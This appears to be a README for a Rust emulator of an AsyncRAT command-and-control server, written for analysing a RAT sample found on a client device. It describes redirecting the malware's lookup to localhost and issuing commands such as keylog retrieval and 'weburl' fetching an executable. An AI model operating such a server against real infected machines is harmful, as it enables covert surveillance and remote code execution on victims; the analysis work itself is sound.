# Generic AsyncRAT Server Emulator
- Rust-based emulator for AsyncRAT C2 server, handling TLS connections, gzip-compressed MessagePack payloads, and command sending via stdin. 
- Based off of the study of a .NET RAT that was found on a client device: [VirusTotal Scan](https://www.virustotal.com/gui/file/d9b84bb470f504814bd4b1e0bc5aa07297ddec881be54fd428e4564ac61c1fb1)

## Features
- TLS support with PKCS12 certificates.
- Decompresses and parses incoming MessagePack commands.
- Sends commands from stdin (e.g., "gettxt", "klget").
- Logs raw hex, decompressed data, and parsed commands.
- Strict Command enum for type-safe handling.

## Setup
1. Generate PKCS12 certificate (This step required me to patch the binary, but I also got around this by just patching the binary to skip the certificate check):
   ```
   openssl req -x509 -newkey rsa:2048 -keyout cert.key.pem -out cert.pem -days 3650 -nodes -subj "/CN=AsyncRAT Server"
   openssl pkcs12 -export -out certs/identity.pfx -inkey cert.key.pem -in cert.pem -password pass:toor
   ```

2. Build and run:
   ```
   cargo build
   cargo run
   ```
  
3. Setup Fiddler
- Enable fiddler's system proxy
- Create a rule that captures incoming traffic from https://pastebin.com
- Make the rule modify the response body with the following: `127.0.0.1:1030`

Now the virus will not be able to communicate with the actual C2 server, and fiddler will cause the virus to connect to this local rust server.

## Usage
- The server listens on `0.0.0.0:1030`.
- Send commands via stdin, e.g.:
  ```
  gettxt
  klget
  weburl http://example.com/file.exe .exe
  setxt test text
  block example.com
  ```

## Troubleshooting
- **TLS Errors**: Verify certificate patch in virus (e.g., `aatxTIJIMtuk` returns `true`), PKCS12 password, and TLS versions (TLS 1.0-1.2).
- **No Data**: If using NoPE Proxy / MITM Proxy, check their forwarding rules, virus IP routing, and hosts file.
- **Command Format**: Inspect logs for prefixes (e.g., `0x03 0x00 0x00`) and adjust in code if needed. Not sure if intentional, but there was always padding with `0x03 0x00 0x00` at the beginning of each payload.
- **Decompression**: Ensure gzip headers (`0x1f 0x8b 0x08`) in payloads; debug with CyberChef.
